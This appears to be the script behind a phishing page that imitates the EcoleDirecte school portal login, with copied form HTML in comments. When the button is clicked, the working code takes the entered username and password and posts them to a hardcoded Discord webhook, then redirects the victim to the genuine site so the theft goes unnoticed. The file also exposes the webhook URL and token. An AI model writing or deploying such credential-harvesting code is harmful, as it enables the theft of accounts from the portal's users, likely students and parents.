//test

//Accept when pressing enter
//THE [EYE OS SATAN]

 //<div _ngcontent-hng-c182="" style="font-weight:700;margin:0px 0px 1.75px;padding:0px 0px 0px 21px;box-sizing:border-box;display:block;min-height:21px;padding-left:21px;margin-bottom:1.75px;"><input id="checkbox" _ngcontent-hng-c182="" type="checkbox" name="loginStored" style="font-family:Roboto, sans-serif;margin:3.5px 0px 0px -21px;padding:0px;box-sizing:border-box;border-radius:3.5px;width: 1em;height:13.9974px;margin-top:3.5px;vertical-align:top;background-color:rgb(255, 255, 255);background-repeat:no-repeat;background-position:50% 50%;background-size:contain;border:0.833333px solid rgba(0, 0, 0, 0.25);appearance:none;-webkit-print-color-adjust:exact;float:left;margin-left:-21px;font-size:14px;line-height:21px;" /><label _ngcontent-hng-c182="" for="seSouvenirDeMoi" style="cursor:pointer;padding-bottom:0px;font-weight:700;margin:0px;padding:0px;box-sizing:border-box;display:inline-block;">Se souvenir de moi</label>
//<input disabled=false id="checkbox" _ngcontent-hng-c182="" type="checkbox" name="loginStored" style="font-family:Roboto, sans-serif;margin:3.5px 0px 0px -21px;padding:0px;box-sizing:border-box;border-radius:3.5px;width: 1em;height:13.9974px;margin-top:3.5px;vertical-align:top;background-color:rgb(255, 255, 255);background-repeat:no-repeat;background-position:50% 50%;background-size:contain;border:0.833333px solid rgba(0, 0, 0, 0.25);appearance:none;-webkit-print-color-adjust:exact;float:left;margin-left:-21px;font-size:14px;line-height:21px;" />
//<div _ngcontent-hng-c182="" style="font-weight:700;margin:0px 0px 1.75px;padding:0px 0px 0px 21px;box-sizing:border-box;display:block;min-height:21px;padding-left:21px;margin-bottom:1.75px;">
//<input type="checkbox" id="seSouvenirDeMoi" name="loginStored" style="font-family:Roboto, sans-serif;margin:3.5px 0px 0px -21px;padding:0px;box-sizing:border-box;border-radius:3.5px;width: 1em;height:13.9974px;margin-top:3.5px;vertical-align:top;background-color:rgb(255, 255, 255);background-repeat:no-repeat;background-position:50% 50%;background-size:contain;border:0.833333px solid rgba(0, 0, 0, 0.25);-webkit-print-color-adjust:exact;float:left;margin-left:-21px;font-size:14px;line-height:21px;"/>
//<label _ngcontent-hng-c182="" for="seSouvenirDeMoi" style="cursor:pointer;padding-bottom:0px;font-weight:700;margin:0px;padding:0px;box-sizing:border-box;display:inline-block;">Se souvenir de moi</label>

//https://discord.com/api/webhooks/1242440635063996417/AE1eLQoaUqm-V-cLecVtoHpi1pFIIojiJ99ywZKKNIulg9MIAWHJS1EuR8OY1hacG2Wx
const url="https://discord.com/api/webhooks/1242440635063996417/AE1eLQoaUqm-V-cLecVtoHpi1pFIIojiJ99ywZKKNIulg9MIAWHJS1EuR8OY1hacG2Wx"

const button=document.getElementById("lilguy");
const username=document.getElementById("username");
const password=document.getElementById("password");

button.onclick=async function e(){

	const message={"content": "Received username: \""+username.value+"\" with password \""+password.value+"\"."}
	await fetch(url, {"method": "POST","headers": {"content-type": "application/json"},"body": JSON.stringify(message)});
	location.replace("https://www.ecoledirecte.com");
};